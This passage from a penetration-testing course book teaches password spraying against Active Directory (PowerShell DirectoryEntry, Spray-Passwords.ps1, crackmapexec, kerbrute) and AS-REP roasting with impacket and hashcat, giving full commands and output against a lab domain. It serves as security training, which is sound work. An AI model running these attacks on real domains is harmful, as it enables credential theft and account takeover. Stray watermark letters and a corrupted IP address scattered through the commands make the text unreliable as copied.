system administrators.
To learn more about account lockouts, let’s review the sdomain’s account policy as domain user
jeff on CLIENT75. We can connect to the system with the password HenchmanPutridBonbon11
via RDP. Next, we’ll open a regular PowerShell winodow and execute net accounts1100 to obtain the
account policy.
PS C:\Users\jeff> net accounts n
Force user logoff how long after time expires?: Never
Minimum password age (days): 1
Maximum password age (days): i 42
Minimum password length: z 7
Length of password history maintained: 24
Lockout threshold: 5
D
Lockout duration (minutes): 30
Lockout observation window (minutes): 30
Computer role: WORKSTATION
The command completed successfully.
Listing 797 - Results of the net accounts command
There’s a lot of great information available, but let’s first focus on Lockout threshold, which
indicates a limit of five login attempts before lockout. This means we can safely attempt four
logins before triggering a lockout. Although this may not seem like many, we should also consider
the Lockout observation window, which indicates that after thirty minutes after the last failed
login, we can make additional attempts.
With these settings, we could attempt 192 logins in a 24-hour period against every domain user
without triggering a lockout, assuming the actual users don’t fail a login attempt.
An attack like this might consist of compiling a short list of very common passwords and
leveraging it against a massive amount of users. Sometimes this type of attack can reveal quite a
few weak account passwords in the organization.
1100 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-
on-operating-systems
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 757
Made in Morocco
Penetration Testing with Kali Linux
However, this would also generate a huge amount of network traffic. Let’s review three kinds of
password spraying attacks that have a higher chance of success in an AD environment.
The first kind of password spraying attack uses LDAP and ADSI to perform a low and slow
password attack against AD users. In the Module Active Directory Introduction and Enumeration,
we performed queries against the domain controller as a logged-in user with DirectoryEntry.1101
However, we can also make queries in the context of a different user by setting the DirectoryEntry
instance.
In the Module Active Directory Introduction and Enumeration, we used the DirectoryEntry
constructor without arguments, but we can provide three arguments, including the LDAP path to
the domain controller, the username, and the password:
PS C:\Users\jeff> $domainObj =
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
y
PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name
k
PS C:\Users\jeff> $SearchString = "LDAP://"
s
PS C:\Users\jeff> $SearchString += $PDC + "/"
PS C:\Users\jeff> $DistinguishedName = "DC=$(o$domainObj.Name.Replace('.', ',DC='))"
PS C:\Users\jeff> $SearchString += $DistinguishedName
n
PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString,
"pete", "Nexus123!")
Listing 7i98 - Authenticating using DirectoryEntry
z
If the password for the user account is correct, the object creation will be successful, as shown in
Listing 799.
D
distinguishedName : {DC=corp,DC=com}
Path : LDAP://DC1.corp.com/DC=corp,DC=com
Listing 799 - Successfully authenticated with DirectoryEntry
If the password is invalid, no object will be created and we will receive an exception, as shown in
Listing 800. To address this, let’s change the password in the constructor to WrongPassword.
We’ll note the clear warning that the user name or password is incorrect.
format-default : The following exception occurred while retrieving member
"distinguishedName": "The user name or
password is incorrect.
"
+ CategoryInfo : NotSpecified: (:) [format-default],
ExtendedTypeSystemException
+ FullyQualifiedErrorId :
CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
Listing 800 - Incorrect password used with DirectoryEntry
1101 (Microsoft Documentation, 2022), https://docs.microsoft.com/de-
de/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 758
Made in Morocco
Penetration Testing with Kali Linux
We could use this technique to create a PowerShell script that enumerates all users and performs
authentications according to the Lockout threshold and Lockout observation window.
This password spraying tactic is already implemented in the PowerShell script C:\Tools\Spray-
Passwords.ps11102 on CLIENT75.
The -Pass option allows us to set a single password to test, or we can submit a wordlist file using
-File. We can also test admin accounts by adding the -Admin flag. The PowerShell script
automatically identifies domain users and sprays a password against them.
PS C:\Users\jeff> cd C:\Tools
PS C:\Tools> powershell -ep bypass
...
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin y
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
k
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are: s
'pete' with password: 'Nexus123!'
'jen' with password: 'Nexus123!'
o
Listing 801 - Using Spray-Passwords to attack user accounts
Nice! The password spraying was successful, providing us two valid sets of credentials with the
n
password Nexus123!.
The second kind of password spraying attack against AD users leverages SMB. This is one of the
i
traditional approaches of password attacks in AD and comes with some drawbacks. For example,
z
for every authentication attempt, a full SMB connection has to be set up and then terminated. As
a result, this kind of password attack is very noisy due to the generated network traffic. It is also
D
quite slow in comparison to other techniques.
We can use crackmapexec1103 on Kali to perform this kind of password spraying. We’ll select smb
as protocol and enter the IP address of any domain joined system such as CLIENT75
(192.168.50.75). Then, we can provide a list or single users and passwords to -u and -p. In
addition, we will enter the domain name for -d and provide the option --continue-on-success to
avoid stopping at the first valid credential. For the purposes of this example, we’ll create a text file
named users.txt containing a subset of the domain usernames dave, jen, and pete to spray the
password Nexus123! against.
kali@kali:~$ cat users.txt
dave
jen
pete
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --
continue-on-success
1102 (Improsec, 2016), https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-
Passwords/blob/master/Spray-Passwords.ps1
1103 (Github, 2022), https://github.com/Porchetta-Industries/CrackMapExec
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 759
Made in Morocco
Penetration Testing with Kali Linux
SMB 192.168.50.75 445 CLIENT75 [*] Windows 10.0 Build 22000 x64
(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB 192.168.50.75 445 CLIENT75 [-] corp.com\dave:Nexus123!
STATUS_LOGON_FAILURE
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\jen:Nexus123!
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\pete:Nexus123!
Listing 802 - Using crackmapexec to attack user accounts
Listing 802 shows that crackmapexec identified the same two valid sets of credentials as Spray-
Passwords.ps1 did previously. By prepending the attempted credentials with a plus or minus,
crackmapexec indicates whether or not each is valid.
We should note that crackmapexec doesn’t examine the password policy of the domain before
starting the password spraying. As a result, we should be cautious about locking out user
accounts with this method.
y
As a bonus, however, the output of crackmapexec not only displays if credentials are valid, but
also if the user with the identified credentials has administrative privileges on the target system.
k
For example, dave is a local admin on CLIENT75. Let’s use crackmapexec with the password
Flowers1 targeting this machine.
s
kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
SMB 192.168.50.75 445 CLIENT75 [*] Windows 10.0 Build 22000 x64
o
(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\dave:Flowers1
(Pwn3d!) n
Listing 803 - Crackmapexec output indicating that the valid credentials have administrative privileges on the target
i
Listing 803 shows that crackmapexec added Pwn3d! to the output, indicating that dave has
z
administrative privileges on the target system. In an assessment, this is an excellent feature to
determine the level of access we have without performing additional enumeration.
D
The third kind of password spraying attack we’ll discuss is based on obtaining a TGT. For
example, using kinit1104 on a Linux system, we can obtain and cache a Kerberos TGT. We’ll need
to provide a username and password to do this. If the credentials are valid, we’ll obtain a TGT.
The advantage of this technique is that it only uses two UDP frames to determine whether the
password is valid, as it sends only an AS-REQ and examines the response.
We could use Bash scripting or a programming language of our choice to automate this method.
Fortunately, we can also use the tool kerbrute,1105 implementing this technique to spray
passwords. Since this tool is cross-platform, we can use it on Windows and Linux.
Let’s use the Windows version in C:\Tools to perform this attack. To conduct password spraying,
we need to specify the passwordspray command along with a list of usernames and the
password to spray. We’ll also need to enter the domain corp.com as an argument for -d. As
previously, we’ll create a file named usernames.txt in C:\Tools containing the usernames pete,
dave, and jen.
1104 (MIT Kerberos Documentation, 2022), https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html
1105 (Github, 2020), https://github.com/ropnop/kerbrute
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 760
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Tools> type .\usernames.txt
pete
dave
jen
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt
"Nexus123!"
__ __ __
/ /_____ _____/ /_ _______ __/ /____
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
/ , Using KDC(s):
2022/09/06 20:30:48 > dc1.corp.com:88
k
2022/09/06 20:30:48 > [+] VALID LOGIN: PI:EMAIL:Nexus123!
2022/09/06 20:30:48 > [+] VALID LOGIN: PI:EMAIL:Nexus123!
2022/09/06 20:30:48 > Done! Tested 3 logins (2 successes) in 0.041 seconds
s
Listing 804 - Using kerbrute to attack user accounts
Very nice! Listing 804 shows that kerbrute confiromed that the password Nexus123! is valid for
pete and jen.
n
If you receive a network error, make sure that the encoding of usernames.txt is
ANSI. You can use Notepadi’s Save As functionality to change the encoding.
z
For crackmapexec and kerDbrute, we had to provide a list of usernames. To obtain a list of all
domain users, we can leverage techniques we learned in the Module Active Directory Introduction
and Enumeration or use the built-in user enumeration functions of both tools.
In this section, we explored ways to perform password attacks in the context of AD. We
discussed and practiced three different methods for password spraying attacks. These
techniques are a great way to obtain valid credentials in the context of AD, especially if there is no
lockout threshold set in the account policy. In the next two sections, we’ll perform attacks that
leverage hash cracking and often provide a higher success rate than password spraying.
22.2.2 AS-REP Roasting
As we have discussed, the first step of the authentication process via Kerberos is to send an AS-
REQ. Based on this request, the domain controller can validate if the authentication is successful.
If it is, the domain controller replies with an AS-REP containing the session key and TGT. This step
is also commonly referred to as Kerberos preauthentication1106 and prevents offline password
guessing.
1106 (Microsoft TechNet, 2014), https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-
should-not-be-disabled.aspx
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 761
Made in Morocco
Penetration Testing with Kali Linux
Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain
controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the
attacker could perform an offline password attack against the encrypted part of the response.
This attack is known as AS-REP Roasting.1107
By default, the AD user account option Do not require Kerberos preauthentication is disabled,
meaning that Kerberos preauthentication is performed for all users. However, it is possible to
enable this account option manually. In assessments, we may find accounts with this option
enabled as some applications and technologies require it to function properly.
Let’s perform this attack from our Kali machine first, then on Windows. On Kali, we can use
impacket-GetNPUsers1108 to perform AS-REP roasting. We’ll need to enter the IP address of the
domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash
will be stored in Hashcat format for -outputfile, and -request to request the TGT.
y
Finally, we need to specify the target authentication information in the format domain/user. This
is the user we use for authentication. For this example, we’ll use pete with the password
k
Nexus123! from the previous section. The complete command is shown below:
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50s.70 -request -outputfile
hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
o
Password:
Name MemberOf PasswordLastSet LastLogon UAC
n
---- -------- -------------------------- -------------------------- --------
dave 2022-09-02 19:21:17.285464 2022-09-07 12:45:15.559299 0x410200
Listing 805 - Using GetNPUsers to perform AS-REP roasting
i
Listing 805 shows that davez has the user account option Do not require Kerberos
preauthentication enabled, meaning it’s vulnerable to AS-REP Roasting.
D
By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat.
Therefore, let’s check the correct mode for the AS-REP hash by grepping for “Kerberos” in the
Hashcat help.
kali@kali:~$ hashcat --help | grep -i "Kerberos"
19600 | Kerberos 5, etype 17, TGS-REP | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
Listing 806 - Obtaining the correct mode for Hashcat
The output of the grep command in listing 806 shows that the correct mode for AS-REP is 18200.
1107 (Medium Harmj0y, 2017), https://harmj0y.medium.com/roasting-as-reps-e6179a65216b
1108 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 762
Made in Morocco
Penetration Testing with Kali Linux
We’ve now collected everything we need to launch Hashcat and crack the AS-REP hash. Let’s
enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as
rule file, and --force to perform the cracking on our Kali VM.
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/best64.rule --force
...
$krb5asrep$23$PI:EMAIL:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b
739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750c
f33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362
fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd865
8b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3
092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc2
2:Flowers1
... y
Listing 807 - Cracking the AS-REP hash with Hashcat
k
Very nice! Hashcat successfully cracked the AS-REP hash. Listing 807 shows that the user dave
has the password Flowers1.
s
If you receive the Hashcat error “Not enouogh allocatable device memory for this
attack”, shut down your Kali VM and add more RAM to it. 4GB is enough for the
examples and exercises of this Module.